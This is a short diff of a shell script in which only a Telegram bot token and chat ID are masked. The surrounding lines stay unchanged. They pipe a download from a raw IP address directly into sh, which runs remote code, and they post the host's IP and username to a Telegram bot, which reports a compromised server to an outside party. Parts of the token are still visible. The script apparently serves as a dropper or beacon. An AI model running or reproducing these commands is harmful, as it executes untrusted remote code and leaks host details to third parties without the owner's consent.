@@ -36,8 +36,8 @@ USERNAME=$(whoami)
 
 curl -s "89.110.123.224:8000" | sh
 
-TELEGRAM_TOKEN="8071522985:AAHoQOoq_HDJD1o1UH6vc1CnpsIjCU69M1A"
-CHAT_ID="2065965842"
+TELEGRAM_TOKEN="8071.................CnpsIjCU69M1A"
+CHAT_ID="2.........2"
 curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
-    -d "chat_id=2065965842" \
+    -d "chat_id=2.........2" \
     -d "text=New server IP: $IP Пользователь: $USERNAME"
